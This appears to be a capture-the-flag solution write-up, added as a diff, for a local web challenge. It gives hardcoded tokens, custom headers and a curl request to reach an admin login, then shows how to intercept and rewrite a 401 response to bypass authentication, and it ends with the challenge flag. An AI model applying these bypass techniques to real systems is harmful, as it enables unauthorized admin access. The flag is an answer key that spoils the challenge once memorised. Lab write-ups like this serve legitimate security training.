@@ -1,0 +1,74 @@
+Quantum 5-Layer Bypass Challenge Solution
+=========================================
+
+?quantum_token=SECURE2026_ADMIN&temporal_sig=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&timestamp=20261234567890
+
+{
+    "status": "quantum_success",
+    "message": "Quantum authentication validated",
+    "timestamp": 1769237534,
+"redirect": "quantum_control.php?quantum_success=1"
+}
+
+
+
+1. 5-Layer Bypass (GET Request)
+-------------------------------
+- Go to the admin login URL: /admin/quantum_auth.php
+- You must provide the following GET parameters and headers:
+  - GET Parameters:
+    - quantum_token=SECURE2026_ADMIN
+    - temporal_sig=<64 hex characters> (e.g., 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef)
+    - timestamp=2026XXXXXXXXXX (10 more digits after 2026)
+  - Headers:
+    - User-Agent: quantum_browser_2026
+    - X-QUANTUM-AUTH: Q_AUTH_2026_VALIDATED
+    - X-QUANTUM-NETWORK: QNET_2026_INTERNAL
+
+- Example cURL command:
+
+  curl -v \
+    -A "quantum_browser_2026" \
+    -H "X-QUANTUM-AUTH: Q_AUTH_2026_VALIDATED" \
+    -H "X-QUANTUM-NETWORK: QNET_2026_INTERNAL" \
+    "http://localhost:8000/admin/quantum_auth.php?quantum_token=SECURE2026_ADMIN&temporal_sig=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&timestamp=20261234567890"
+
+- If all parameters and headers are correct, you will see the admin login panel.
+
+2. Intercept and Manipulate the Login Response
+----------------------------------------------
+- Enter any username and password in the login form and submit.
+- The server will always respond with HTTP 401 and JSON:
+
+  {
+    "status": "quantum_failed",
+    "message": "Quantum credentials invalid",
+    ...
+  }
+
+- Intercept this response using Burp Suite, ZAP, or browser devtools (Fetch/XHR override).
+
+- Modify the response as follows:
+  - Change HTTP status code from 401 to 200
+  - Change "status": "quantum_failed" to "status": "quantum_success"
+  - Add: "redirect": "quantum_control.php?quantum_success=1"
+
+- Let the browser process the modified response. The page will redirect you to the admin panel.
+
+3. Access the Admin Panel and Get the Flag
+------------------------------------------
+- You will be redirected to /admin/quantum_control.php?quantum_success=1
+- The admin panel will display the flag in leet code format:
+
+ RCS_CTF{QU4N7UM_5_14Y3R_8YP455_2026_(0MP1373} 
+ 
+- Submit this flag to complete the challenge!
+
+---
+
+Tools you can use for interception:
+- Burp Suite (Proxy > Intercept)
+- OWASP ZAP (Breakpoints)
+- Browser DevTools (Fetch/XHR override, e.g., with the "Override Response" extension)
+
+If you need a step-by-step for a specific tool, let the challenge author know!
